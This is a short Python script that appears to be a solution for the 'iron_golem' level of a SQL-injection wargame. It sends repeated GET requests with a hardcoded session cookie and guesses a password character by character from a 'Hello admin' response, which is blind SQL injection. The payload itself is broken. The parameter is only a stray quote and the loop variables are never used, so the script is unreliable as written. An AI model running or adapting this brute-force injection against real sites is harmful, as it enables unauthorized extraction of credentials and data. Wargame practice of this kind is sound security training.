import requests
import string

char = string.printable
url="https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php/"
header = {'Cookie':'PHPSESSID=m71i19igi78valu1kj9kccu53j'}
session = requests.Session()
flag = ""
for j in range(1,25):
    print(j , "======================================================")
    for i in char:
        r = session.get(url = url , headers = header , params = f"pw=' ")
        print(r.url)
        if "Hello admin" in r.text:
            flag += i
            print("flag : " , flag)
            break